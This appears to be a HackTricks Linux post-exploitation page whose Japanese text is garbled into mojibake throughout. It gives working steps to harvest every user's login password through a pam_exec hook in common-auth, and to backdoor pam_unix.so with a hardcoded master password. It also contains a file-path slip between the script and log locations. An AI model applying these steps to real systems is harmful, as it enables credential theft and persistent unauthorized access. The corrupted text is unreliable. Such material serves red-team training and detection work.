# Linuxãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

<details>

<summary><strong>**htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰**ã§**ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ã‚’å­¦ã¶ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã—ãŸã‚Šã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡º**ã—ã¦ãã ã•ã„ã€‚

</details>

## PAMã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚ªãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹

PAMãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’æ§‹æˆã—ã¦ã€å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã«ä½¿ç”¨ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¨˜éŒ²ã—ã¾ã™ã€‚PAMãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

ã¾ãšã€æ–°ã—ã„èªè¨¼ãŒç™ºç”Ÿã™ã‚‹ãŸã³ã«å‘¼ã³å‡ºã•ã‚Œã‚‹bashã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
å¤‰æ•°ã¯PAMå›ºæœ‰ã§ã‚ã‚Šã€`pam_exec.so`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä»‹ã—ã¦åˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã¯å¤‰æ•°ã®æ„å‘³ã§ã™ï¼š

- **$PAM\_USER:** å…¥åŠ›ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã€‚
- **$PAM\_RHOST:** ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆï¼ˆé€šå¸¸ã¯IPã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰
- **$(cat -):** ã“ã‚Œã¯`stdin`ã‚’èª­ã¿å–ã‚Šã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå–å¾—ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¾ã™ã€‚
- çµæœã¯`/var/log/toomanysecrets.log`ã«ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ‘ã‚¤ãƒ—ã•ã‚Œã¾ã™ã€‚

**ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚ãªã„ã‚ˆã†ã«ã™ã‚‹**ã«ã¯ã€äº‹å‰ã«ä½œæˆã—ã¦`chmod`ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’æ¤œè¨ã—ã¦ãã ã•ã„ã€‚
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
æ¬¡ã«ã€PAMæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›´æ–°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚`pam_exec`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

`/etc/pam.d/`ã«ã¯ã•ã¾ã–ã¾ãªæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã€`common-auth`ã‚’é¸æŠã—ã¾ã™ã€‚
```
sudo nano /etc/pam.d/common-auth
```
ãƒ•ã‚¡ã‚¤ãƒ«ã®æœ€ä¸‹éƒ¨ã«ã€ä»¥ä¸‹ã®èªè¨¼ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è¿½åŠ ã—ã¦ãã ã•ã„ï¼š

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®æ„å‘³ã¯æ¬¡ã®é€šã‚Šã§ã™ï¼š

- **optional:** ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¦ã‚‚èªè¨¼ãŒå¤±æ•—ã—ãªã„ï¼ˆå¿…é ˆã‚¹ãƒ†ãƒƒãƒ—ã§ã¯ãªã„ï¼‰
- **pam\_exec.so:** ä»»æ„ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹ PAM ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«
- **expose\_authtok:** `stdin` ã‚’ä»‹ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’èª­ã¿å–ã‚‹ãƒˆãƒªãƒƒã‚¯
- **quiet:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¨ãƒ©ãƒ¼ã‚’è¡¨ç¤ºã—ãªã„ï¼ˆä½•ã‹ãŒã†ã¾ãã„ã‹ãªã„å ´åˆï¼‰
- æœ€å¾Œã®å¼•æ•°ã¯ä»¥å‰ã«ä½œæˆã—ãŸã‚·ã‚§ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™

![](<../../.gitbook/assets/image (375).png>)

æœ€å¾Œã«ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œå¯èƒ½ã«ã—ã¾ã™ï¼š

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

ã“ã‚Œã§ã€åˆ¥ã®ãƒã‚·ãƒ³ã‹ã‚‰ ssh ã—ãŸã‚Šã€ãƒ­ãƒ¼ã‚«ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸã‚Šã—ã¦ã¿ã¦ãã ã•ã„ã€‚

ãã—ã¦ã€ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### PAMã¸ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢è¨­ç½®

PAMã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã«ç§»å‹•ã—ã¾ã™ï¼ˆãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ãŒã€è‡ªåˆ†ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨åŒã˜ã‚‚ã®ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ï¼‰ã€‚ãã—ã¦ã€pam_unix_auth.cãƒ•ã‚¡ã‚¤ãƒ«ã®170/180è¡Œä»˜è¿‘ã‚’èª¿ã¹ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

ã“ã‚Œã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å¤‰æ›´ã—ã¾ã™ï¼š

![](<../../.gitbook/assets/image (638) (2) (2).png>)

ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ "0xMitsurugi"** ã‚’ä½¿ç”¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

`pam_unix_auth.c`ã‚’å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã€`pam_unix.so`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç½®ãæ›ãˆã¾ã™ã€‚
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)ã§è‡ªå‹•åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## å‚è€ƒæ–‡çŒ®

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
